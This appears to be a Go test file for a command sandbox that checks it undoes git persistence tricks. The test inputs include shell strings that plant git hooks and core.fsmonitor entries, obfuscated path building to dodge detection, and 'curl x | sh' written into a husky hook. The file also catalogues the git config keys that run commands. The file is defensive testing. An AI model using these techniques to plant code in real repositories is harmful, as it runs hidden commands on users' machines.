package engine

import (
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"slices"
	"strings"
	"testing"
)

// A confined command cannot leave behind what git runs on its own: a hook or
// a core.fsmonitor planted through a path built at run time is put back after
// the command, while ordinary changes (a remote, user.name) stay.
func TestConfinedCommandCannotPlantGitCode(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("no git")
	}
	project, _, run := sandboxFixture(t, DefaultSandbox())
	if out, err := exec.Command("git", "-C", project, "init", "-q").CombinedOutput(); err != nil {
		t.Fatalf("git init: %v %s", err, out)
	}
	own := filepath.Join(project, ".git", "hooks", "pre-push")
	if err := os.WriteFile(own, []byte("#!/bin/sh\necho mine\n"), 0o755); err != nil {
		t.Fatal(err)
	}

	res := run(`g=.gi; g=${g}t; h=hoo; h=${h}ks; printf '#!/bin/sh\ntouch /tmp/pwned\n' > $g/$h/pre-commit; chmod +x $g/$h/pre-commit; ` +
		`printf 'evil\n' > $g/$h/pre-push; ` +
		`c=conf; c=${c}ig; git config -f $g/$c core.fsmonitor 'touch /tmp/pwned'; git config -f $g/$c alias.st '!sh -c x'; ` +
		`git remote add origin https://example.com/r.git; git config user.name Ada`)
	if _, err := os.Stat(filepath.Join(project, ".git", "hooks", "pre-commit")); err == nil {
		t.Error("a planted hook survived the command")
	}
	if b, _ := os.ReadFile(own); string(b) != "#!/bin/sh\necho mine\n" {
		t.Errorf("the user's own hook was not put back: %q", b)
	}
	cfg, _ := os.ReadFile(filepath.Join(project, ".git", "config"))
	if strings.Contains(string(cfg), "fsmonitor") || strings.Contains(string(cfg), "sh -c x") {
		t.Errorf("a planted config entry survived:\n%s", cfg)
	}
	if runtime.GOOS == "darwin" {
		// Seatbelt refuses those writes outright, ordinary config changes
		// included (they need an approved unsandboxed run there); nothing
		// is left to put back.
		return
	}
	if !strings.Contains(fmtData(res), "ouija put back") {
		t.Errorf("the result does not say what was put back: %s", fmtData(res))
	}
	// The planted entries went with the whole config edit, ordinary ones in
	// the same command included: the config is put back as it was.
	res = run(`git remote add origin https://example.com/r.git && git config user.name Ada && git init -q sub`)
	cfg, _ = os.ReadFile(filepath.Join(project, ".git", "config"))
	if !strings.Contains(string(cfg), "example.com/r.git") || !strings.Contains(string(cfg), "Ada") {
		t.Errorf("ordinary config changes were undone:\n%s\n%s", cfg, fmtData(res))
	}
}

// A repository the confined command creates keeps everything but what runs.
func TestStripRunnable(t *testing.T) {
	in := "[core]\n\trepositoryformatversion = 0\n\tfsmonitor = touch x\n[alias]\n\tst = status\n\tx = !sh\n[filter \"lfs\"]\n\tclean = evil\n[user]\n\tname = Ada\n"
	got := string(stripRunnable([]byte(in)))
	for _, gone := range []string{"fsmonitor", "!sh", "clean = evil"} {
		if strings.Contains(got, gone) {
			t.Errorf("%q kept:\n%s", gone, got)
		}
	}
	for _, kept := range []string{"repositoryformatversion", "st = status", "name = Ada"} {
		if !strings.Contains(got, kept) {
			t.Errorf("%q dropped:\n%s", kept, got)
		}
	}
	if added := newRunnableEntries([]byte(in), []byte(in)); len(added) != 0 {
		t.Errorf("an unchanged config reported %v", added)
	}
	if added := newRunnableEntries(nil, []byte("[CORE]\n  HooksPath=/x\n[includeIf \"gitdir:/\"]\n path=/y\n")); len(added) != 2 {
		t.Errorf("case and includeIf not caught: %v", added)
	}
}

// The config parser follows git's grammar: what git reads as a command is
// what ouija sees, and anything it cannot read is treated as runnable.
func TestGitConfigParserEdgeCases(t *testing.T) {
	for in, want := range map[string]string{
		"[x] [core] fsmonitor = cmd\n":                                 "core.fsmonitor",
		"[core] # c\n\tfsmonitor = \\\n  touch x\n":                    "core.fsmonitor",
		"[CORE]\n\tFsMonitor=x\n":                                      "core.fsmonitor",
		"[core]\r\n\tpager = less\r\n":                                 "core.pager",
		"[remote.origin]\n\tuploadpack = x\n":                          "remote.origin.uploadpack",
		"[remote \"a \\\"b\"]\n\treceivepack = x\n":                    `remote.a "b.receivepack`,
		"[includeIf \"gitdir:~/x/\"]\n\tpath = y\n":                    "includeif.gitdir:~/x/.path",
		"[alias]\n\tst = \"!sh\"\n":                                    "alias.st",
		"[interactive]\n\tdiffFilter = x\n":                            "interactive.difffilter",
		"[trailer \"sign\"]\n\tcommand = x\n":                          "trailer.sign.command",
		"[trailer \"sign\"]\n\tcmd = x\n":                              "trailer.sign.cmd",
		"[guitool \"x\"]\n\tcmd = x\n":                                 "guitool.x.cmd",
		"[browser \"x\"]\n\tcmd = x\n":                                 "browser.x.cmd",
		"[man \"x\"]\n\tpath = x\n":                                    "man.x.path",
		"[sendemail]\n\tsmtpServer = /tmp/x\n":                         "sendemail.smtpserver",
		"[gpg \"ssh\"]\n\tprogram = x\n":                               "gpg.ssh.program",
		"[hook \"lint\"]\n\tcommand = x\n":                             "hook.lint.command",
		"[extensions]\n\tworktreeConfig = true\n":                      "extensions.worktreeconfig",
		"[gc]\n\trecentObjectsHook = x\n":                              "gc.recentobjectshook",
		"[core]\n# " + strings.Repeat("a", 5<<20) + "\n\teditor = x\n": "core.editor", // a line past any scanner buffer
		"[core]\n\tfsmonitor\x00 = x\n":                                gitConfigUnreadable,
		"fsmonitor = x\n":                                              gitConfigUnreadable, // a key before any section
		"[core\n\tfsmonitor = x\n":                                     gitConfigUnreadable,
		"[core]\n\teditor = \"x\n":                                     gitConfigUnreadable, // an open quote
	} {
		added := newRunnableEntries(nil, []byte(in))
		if !slices.Contains(added, want) {
			t.Errorf("%.60q: got %v, want %s", in, added, want)
		}
	}
	for _, in := range []string{
		"[user]\n\tname = Ada # !x\n",
		"[alias]\n\tst = status ; !x\n",
		"[core]\n\tbare = false\n\trepositoryformatversion = 0\n[remote \"origin\"]\n\turl = x\n",
		"[diff]\n\trenames\n",
	} {
		if added := newRunnableEntries(nil, []byte(in)); len(added) != 0 {
			t.Errorf("%q: ordinary entries reported: %v", in, added)
		}
	}
	got := string(stripRunnable([]byte("[x] [core] fsmonitor = cmd\n\tbare = false\n[user]\nname=a\n")))
	if strings.Contains(got, "fsmonitor") || !strings.Contains(got, "bare = false") || !strings.Contains(got, "name=a") {
		t.Errorf("stripRunnable on one-line headers:\n%s", got)
	}
	if got := stripRunnable([]byte("[core\n")); len(got) != 0 {
		t.Errorf("an unreadable new config was kept: %q", got)
	}
}

// Besides .git/config and .git/hooks, the restore covers config.worktree,
// commondir, info/attributes, the submodules' and linked worktrees' git
// directories, a hooks directory swapped for a link and .git swapped for a
// pointer; ordinary changes there stay.
func TestRestoreCoversEveryGitDirectory(t *testing.T) {
	root := t.TempDir()
	git := filepath.Join(root, ".git")
	write := func(rel, data string) {
		t.Helper()
		p := filepath.Join(root, filepath.FromSlash(rel))
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(data), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	exists := func(rel string) bool {
		_, err := os.Lstat(filepath.Join(root, filepath.FromSlash(rel)))
		return err == nil
	}
	read := func(rel string) string {
		b, _ := os.ReadFile(filepath.Join(root, filepath.FromSlash(rel)))
		return string(b)
	}
	write(".git/HEAD", "ref: refs/heads/main\n")
	write(".git/config", "[core]\n\tbare = false\n")
	write(".git/hooks/pre-push", "mine")
	write(".git/modules/lib/x/HEAD", "ref: refs/heads/main\n")
	write(".git/modules/lib/x/config", "[core]\n\tbare = false\n")
	write(".git/modules/lib/x/objects/info/packs", "")
	before := captureGitState(root)

	write(".git/config.worktree", "[core]\n\tfsmonitor = touch pwned\n\tsparseCheckout = true\n")
	write(".git/commondir", "../evil")
	write(".git/info/attributes", "* filter=x\n")
	write(".git/modules/lib/x/config", "[core]\n\tbare = false\n\tfsmonitor = touch pwned\n")
	write(".git/modules/lib/x/hooks/post-checkout", "evil")
	write(".git/modules/new/config", "[core]\n\tpager = evil\n")
	write(".git/worktrees/wt/commondir", "../..\n") // git worktree add
	write(".git/worktrees/wt/config.worktree", "[core]\n\thooksPath = /tmp\n")
	write(".git/worktrees/bad/commondir", "/elsewhere\n")
	evil := filepath.Join(root, "evilhooks")
	write("evilhooks/pre-commit", "evil")
	if err := os.RemoveAll(filepath.Join(git, "hooks")); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(evil, filepath.Join(git, "hooks")); err != nil {
		t.Fatal(err)
	}

	undone := restoreGitState(root, before)
	for _, gone := range []string{".git/commondir", ".git/info/attributes", ".git/modules/lib/x/hooks/post-checkout",
		".git/worktrees/bad/commondir", ".git/hooks/pre-commit"} {
		if exists(gone) {
			t.Errorf("%s survived", gone)
		}
	}
	for rel, bad := range map[string]string{
		".git/config.worktree":              "fsmonitor",
		".git/modules/lib/x/config":         "fsmonitor",
		".git/modules/new/config":           "pager",
		".git/worktrees/wt/config.worktree": "hooksPath",
	} {
		if strings.Contains(read(rel), bad) {
			t.Errorf("%s kept %s:\n%s", rel, bad, read(rel))
		}
	}
	if !strings.Contains(read(".git/config.worktree"), "sparseCheckout") {
		t.Error("an ordinary config.worktree entry was dropped")
	}
	if read(".git/worktrees/wt/commondir") != "../..\n" {
		t.Error("a linked worktree's own commondir was removed")
	}
	if fi, err := os.Lstat(filepath.Join(git, "hooks")); err != nil || !fi.IsDir() || read(".git/hooks/pre-push") != "mine" {
		t.Errorf("the hooks directory was not put back (%v); pre-push = %q", err, read(".git/hooks/pre-push"))
	}
	if len(undone) < 8 {
		t.Errorf("undone = %v", undone)
	}

	// .git swapped for a pointer to a directory with a hook: the pointer goes.
	before = captureGitState(root)
	if err := os.Rename(git, filepath.Join(root, "moved")); err != nil {
		t.Fatal(err)
	}
	write("moved/hooks/pre-commit", "evil")
	write(".git", "gitdir: moved\n")
	if undone := restoreGitState(root, before); exists(".git") || len(undone) == 0 {
		t.Errorf("a .git pointer that replaced the git directory survived: %v", undone)
	}

	// A linked worktree's pointer rewritten: put back.
	write(".git", "gitdir: moved\n")
	before = captureGitState(root)
	write(".git", "gitdir: evilhooks\n")
	if restoreGitState(root, before); read(".git") != "gitdir: moved\n" {
		t.Errorf(".git pointer = %q", read(".git"))
	}
}

// The guard sees what the restore covers: a submodule's config, a
// config.worktree and .git itself.
func TestGitGuardSeesSubmodulesAndWorktreeConfig(t *testing.T) {
	root := t.TempDir()
	for rel, data := range map[string]string{".git/HEAD": "x", ".git/config": "", ".git/modules/x/HEAD": "x", ".git/modules/x/config": ""} {
		p := filepath.Join(root, filepath.FromSlash(rel))
		_ = os.MkdirAll(filepath.Dir(p), 0o755)
		if err := os.WriteFile(p, []byte(data), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	before := gitGuardSnapshot(root)
	_ = os.WriteFile(filepath.Join(root, ".git", "modules", "x", "config"), []byte("[core]\n\tfsmonitor = x\n"), 0o644)
	_ = os.WriteFile(filepath.Join(root, ".git", "config.worktree"), []byte("[core]\n\tpager = x\n"), 0o644)
	notice := gitGuardNotice(root, before, gitGuardSnapshot(root))
	for _, want := range []string{"modules", "config.worktree"} {
		if !strings.Contains(notice, want) {
			t.Errorf("notice misses %s: %q", want, notice)
		}
	}
}

// The config reader agrees with git itself: whatever git reads from a file
// as an entry that runs a command, the reader reports too (or it calls the
// file unreadable, which puts it back whole). Hand-picked tricky files and a
// few hundred generated ones are checked against `git config --list`.
func TestGitConfigReaderMatchesGit(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}
	dir := t.TempDir()
	env := append(os.Environ(), "GIT_CONFIG_NOSYSTEM=1", "HOME="+dir, "XDG_CONFIG_HOME="+dir, "GIT_CONFIG_GLOBAL=/dev/null")
	check := func(in string) {
		t.Helper()
		f := filepath.Join(dir, "config")
		if err := os.WriteFile(f, []byte(in), 0o600); err != nil {
			t.Fatal(err)
		}
		cmd := exec.Command("git", "config", "--file", f, "--list", "-z")
		cmd.Env = env
		out, err := cmd.Output()
		if err != nil {
			return // git refuses the file: it runs nothing from it
		}
		ours := newRunnableEntries(nil, []byte(in))
		if slices.Contains(ours, gitConfigUnreadable) {
			return
		}
		for _, kv := range strings.Split(strings.TrimSuffix(string(out), "\x00"), "\x00") {
			name, value, _ := strings.Cut(kv, "\n")
			if runnableEntry(gitEntry{name, value}) && !slices.Contains(ours, name) {
				t.Errorf("git reads runnable %q from %q; ouija saw %v", name, in, ours)
			}
		}
	}
	for _, in := range []string{
		"[core\t\"x\"]\n\tfsmonitor = y\n",
		"[core \t \"x\"]\n\tfsmonitor = y\n",
		"[core]fsmonitor=x\n",
		"[core] fsmonitor=x",
		"[core]\n\tfsmonitor = x \\\n y\n",
		"[core]\n\tfsmonitor = \"a\"\"b\" ; c\n",
		"[core]\v\fFSMONITOR\t=\tx\n",
		"\xef\xbb\xbf[core]\nfsmonitor=x\r\n",
		"[core]\n\tfsmonitor=x\\",
		"[core]\n\tfsmonitor",
		"[core] ; c\nfsmonitor=x\n",
		"[ core ]\nfsmonitor=x\n",
		"[core \"x\" ]\nfsmonitor=x\n",
		"[core.x]\nfsmonitor=x\n",
		"[core]\n\tfsmonitor = x\x00y\n",
		"[core]\n\tfsmonitor = \"x\\ty\"\n",
		"[include]\npath=/tmp/x\n",
		"[core]\r\nfsmonitor=x\r",
		"[core]\n\tfsmonitor = x # \"\n",
		"[core]\n\teditor = \"a;b\"\n",
		"[alias]\n\tx = \"!\"sh\n",
		"[alias]\n\tx =   !sh\n",
		"[alias]\n\tx = \\\n!sh\n",
	} {
		check(in)
	}
	// Generated files: valid-looking headers and entries with noise in the
	// places git's grammar is subtle (whitespace, quotes, escapes, comments,
	// continuations), most of which git accepts.
	headers := []string{"[core]", "[CORE]", "[core \"x\"]", "[core\t\"x\"]", "[alias]", "[remote \"o\"]",
		"[core.x]", "[diff \"d\"]", "[x] [core]", "[user]"}
	keys := []string{"fsmonitor", "FsMonitor", "editor", "uploadpack", "textconv", "x", "name", "st"}
	space := []string{"", " ", "\t", "\v", "\f", "  "}
	values := []string{"x", "!sh", "\"a b\"", "\"", "\\\n", "\\t", "\\\"", " ; c", " # c", "\\", "\"#\"", "a\\\nb", "\r", ""}
	ends := []string{"\n", "\r\n", "\n\n", "", " ; c\n", "\\\n"}
	rng := uint32(1)
	pick := func(list []string) string {
		rng = rng*1664525 + 1013904223
		return list[(rng>>8)%uint32(len(list))]
	}
	for range 3000 {
		var b strings.Builder
		for range 1 + rng%3 {
			b.WriteString(pick(headers) + pick(space) + pick([]string{"\n", "", " ; c\n"}))
			for range 1 + rng%3 {
				b.WriteString(pick(space) + pick(keys) + pick(space))
				if pick([]string{"=", "=", "="}) != "" && rng%5 != 0 {
					b.WriteString("=" + pick(space) + pick(values) + pick(values))
				}
				b.WriteString(pick(ends))
			}
		}
		check(b.String())
	}
}

// A core.hooksPath the repository already sets (husky) is watched like
// .git/hooks: a confined command cannot change the hooks there, or what
// husky's hooks run, nor a hook manager's config. Only hooks are watched in
// it, so the project's other files there stay; a hooksPath the command set
// is undone, never followed (nothing under it is removed).
func TestRestoreCoversHooksPathAndHookManagers(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("no git")
	}
	if runtime.GOOS != "linux" {
		t.Skip("the restore runs where .git is writable in the sandbox (Linux)")
	}
	project, _, run := sandboxFixture(t, DefaultSandbox())
	if err := sandboxAvailable(); err != nil {
		t.Skipf("no sandbox here: %v", err)
	}
	git := func(args ...string) {
		t.Helper()
		if out, err := exec.Command("git", append([]string{"-C", project}, args...)...).CombinedOutput(); err != nil {
			t.Fatalf("git %v: %v %s", args, err, out)
		}
	}
	write := func(rel, data string) {
		t.Helper()
		p := filepath.Join(project, rel)
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(data), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	read := func(rel string) string {
		b, err := os.ReadFile(filepath.Join(project, rel))
		if err != nil {
			return "<missing>"
		}
		return string(b)
	}
	git("init", "-q")
	git("config", "core.hooksPath", ".husky/_")
	write(".husky/_/h", "#!/bin/sh\nsh .husky/$1\n")
	write(".husky/_/pre-commit", "#!/bin/sh\n. .husky/_/h pre-commit\n")
	write(".husky/pre-commit", "npm test\n")
	write(".git/hooks/pre-push", "#!/bin/sh\n# File generated by pre-commit: https://pre-commit.com\n")
	write(".pre-commit-config.yaml", "repos: []\n")

	res := run(`echo 'curl x | sh' > .husky/pre-commit; echo evil > .husky/_/h; echo evil > .husky/commit-msg; ` +
		`echo '- repo: local' >> .pre-commit-config.yaml; echo notes > .husky/README; mkdir -p src; echo code > src/main.go`)
	for rel, want := range map[string]string{
		".husky/pre-commit":       "npm test\n",
		".husky/_/h":              "#!/bin/sh\nsh .husky/$1\n",
		".husky/commit-msg":       "<missing>",
		".pre-commit-config.yaml": "repos: []\n",
		".husky/README":           "notes\n",
		"src/main.go":             "code\n",
	} {
		if got := read(rel); got != want {
			t.Errorf("%s = %q, want %q\n%s", rel, got, want, fmtData(res))
		}
	}

	// A hooksPath the command sets is undone; the files under it stay.
	write("lib/pre-commit", "real source\n")
	run(`git config core.hooksPath lib; echo more > lib/post-commit`)
	if cfg := read(".git/config"); !strings.Contains(cfg, ".husky/_") || strings.Contains(cfg, "= lib") {
		t.Errorf("the hooksPath the command set was not undone:\n%s", cfg)
	}
	if read("lib/pre-commit") != "real source\n" || read("lib/post-commit") != "more\n" {
		t.Error("files under a hooksPath the command set were touched")
	}

	// hooksPath at the project root: only hook names are watched there.
	git("config", "core.hooksPath", ".")
	run(`echo evil > post-checkout; echo fine > notes.txt`)
	if read("post-checkout") != "<missing>" || read("notes.txt") != "fine\n" {
		t.Errorf("hooksPath=.: post-checkout %q, notes.txt %q", read("post-checkout"), read("notes.txt"))
	}
}

// Repositories nested in the project (vendor/lib cloned from source) are
// checked like the project's own, and one the command creates keeps nothing
// that runs.
func TestRestoreCoversNestedRepositories(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("no git")
	}
	if runtime.GOOS != "linux" {
		t.Skip("the restore runs where .git is writable in the sandbox (Linux)")
	}
	if err := sandboxAvailable(); err != nil {
		t.Skipf("no sandbox here: %v", err)
	}
	project, _, run := sandboxFixture(t, DefaultSandbox())
	lib := filepath.Join(project, "vendor", "acme", "lib")
	if err := os.MkdirAll(lib, 0o755); err != nil {
		t.Fatal(err)
	}
	for _, dir := range []string{project, lib} {
		if out, err := exec.Command("git", "-C", dir, "init", "-q").CombinedOutput(); err != nil {
			t.Fatalf("git init: %v %s", err, out)
		}
	}
	res := run(`d=vendor/acme/lib/.git; printf '#!/bin/sh\ntouch /tmp/pwned\n' > $d/hooks/pre-commit; chmod +x $d/hooks/pre-commit; ` +
		`git -C vendor/acme/lib config core.fsmonitor 'touch /tmp/pwned'; git -C vendor/acme/lib config user.name Ada; ` +
		`git init -q tools/new && printf '#!/bin/sh\nevil\n' > tools/new/.git/hooks/post-checkout && git -C tools/new config core.pager 'sh -c x'`)
	if _, err := os.Stat(filepath.Join(lib, ".git", "hooks", "pre-commit")); err == nil {
		t.Error("a hook planted in a nested repository survived")
	}
	cfg, _ := os.ReadFile(filepath.Join(lib, ".git", "config"))
	if strings.Contains(string(cfg), "fsmonitor") {
		t.Errorf("a config entry planted in a nested repository survived:\n%s", cfg)
	}
	newRepo := filepath.Join(project, "tools", "new", ".git")
	if _, err := os.Stat(filepath.Join(newRepo, "hooks", "post-checkout")); err == nil {
		t.Error("a hook in a repository the command created survived")
	}
	if cfg, _ := os.ReadFile(filepath.Join(newRepo, "config")); strings.Contains(string(cfg), "pager") || !strings.Contains(string(cfg), "[core]") {
		t.Errorf("the new repository's config: %s", cfg)
	}
	if out := fmtData(res); !strings.Contains(out, "vendor/acme/lib/.git/hooks/pre-commit") {
		t.Errorf("the result does not name the nested repository's hook:\n%s", out)
	}
}

// The walk stops at the depth limit and does not walk node_modules, but
// finds the packages right under it that are git work trees.
func TestNestedReposWalk(t *testing.T) {
	root := t.TempDir()
	for _, d := range []string{"a/.git", "node_modules/x/.git", "node_modules/@s/y/.git", "node_modules/z/node_modules/deep/.git",
		"b/c/.git/modules/m", "1/2/3/4/5/6/7/.git", "1/2/3/4/5/6/7/8/9/.git", "p/q"} {
		if err := os.MkdirAll(filepath.Join(root, d), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.WriteFile(filepath.Join(root, "p", "q", ".git"), []byte("gitdir: ../../.git/modules/q\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	got, complete := nestedRepos(root)
	for i := range got {
		got[i], _ = filepath.Rel(root, got[i])
	}
	want := []string{filepath.Join("1", "2", "3", "4", "5", "6", "7"), "a", filepath.Join("b", "c"),
		filepath.Join("node_modules", "@s", "y"), filepath.Join("node_modules", "x"), filepath.Join("p", "q")}
	if slices.Sort(got); !slices.Equal(got, want) || !complete {
		t.Errorf("nestedRepos = %v (complete %v), want %v", got, complete, want)
	}
}

// The two ways around the restore a review found: a hook planted in a
// package installed from git under node_modules, and a core.fsmonitor added
// to a work-tree file the repository's config already includes. Both run on
// the user's next ordinary git command unless the restore undoes them.
func TestRestoreCoversNodeModulesReposAndIncludedConfigs(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("no git")
	}
	if runtime.GOOS != "linux" {
		t.Skip("the restore runs where .git is writable in the sandbox (Linux)")
	}
	if err := sandboxAvailable(); err != nil {
		t.Skipf("no sandbox here: %v", err)
	}
	project, _, run := sandboxFixture(t, DefaultSandbox())
	pkg := filepath.Join(project, "node_modules", "pkg")
	if err := os.MkdirAll(pkg, 0o755); err != nil {
		t.Fatal(err)
	}
	for _, dir := range []string{project, pkg} {
		if out, err := exec.Command("git", "-C", dir, "init", "-q").CombinedOutput(); err != nil {
			t.Fatalf("git init: %v %s", err, out)
		}
	}
	shared := filepath.Join(project, "shared.gitconfig")
	if err := os.WriteFile(shared, []byte("[user]\n\tname = Team\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if out, err := exec.Command("git", "-C", project, "config", "include.path", "../shared.gitconfig").CombinedOutput(); err != nil {
		t.Fatalf("git config: %v %s", err, out)
	}

	run(`printf '#!/bin/sh\ntouch /tmp/pwned\n' > node_modules/pkg/.git/hooks/pre-commit; chmod +x node_modules/pkg/.git/hooks/pre-commit; ` +
		`printf '[core]\n\tfsmonitor = touch /tmp/pwned\n' >> shared.gitconfig`)
	if _, err := os.Stat(filepath.Join(pkg, ".git", "hooks", "pre-commit")); err == nil {
		t.Error("a hook planted in node_modules/pkg survived")
	}
	b, _ := os.ReadFile(shared)
	if strings.Contains(string(b), "fsmonitor") || !strings.Contains(string(b), "name = Team") {
		t.Errorf("the included config was not put back:\n%s", b)
	}
	cmd := exec.Command("git", "-C", project, "config", "--get", "core.fsmonitor")
	cmd.Env = append(os.Environ(), "GIT_CONFIG_NOSYSTEM=1", "GIT_CONFIG_GLOBAL=/dev/null")
	if out, _ := cmd.Output(); len(out) > 0 {
		t.Errorf("git still reads core.fsmonitor = %s", out)
	}
}

// The restore never deletes what the user keeps under .git/hooks: a
// directory of helpers the hooks source stays, files and all, after an
// ordinary command, and only what the command added there is removed.
func TestRestoreKeepsTheUsersHookDirectories(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("no git")
	}
	if runtime.GOOS != "linux" {
		t.Skip("the restore runs where .git is writable in the sandbox (Linux)")
	}
	if err := sandboxAvailable(); err != nil {
		t.Skipf("no sandbox here: %v", err)
	}
	project, _, run := sandboxFixture(t, DefaultSandbox())
	if out, err := exec.Command("git", "-C", project, "init", "-q").CombinedOutput(); err != nil {
		t.Fatalf("git init: %v %s", err, out)
	}
	lib := filepath.Join(project, ".git", "hooks", "lib")
	if err := os.MkdirAll(filepath.Join(lib, "nested"), 0o755); err != nil {
		t.Fatal(err)
	}
	for _, f := range []string{"helper.sh", "nested/more.sh"} {
		if err := os.WriteFile(filepath.Join(lib, f), []byte("# mine\n"), 0o755); err != nil {
			t.Fatal(err)
		}
	}

	res := run(`echo ok > notes.txt; echo planted > .git/hooks/lib/added.sh`)
	for _, f := range []string{"helper.sh", "nested/more.sh"} {
		if b, err := os.ReadFile(filepath.Join(lib, f)); err != nil || string(b) != "# mine\n" {
			t.Errorf("the user's %s was lost (%v): %q\n%s", f, err, b, fmtData(res))
		}
	}
	if _, err := os.Stat(filepath.Join(lib, "added.sh")); err == nil {
		t.Error("a file the command added under .git/hooks survived")
	}
}
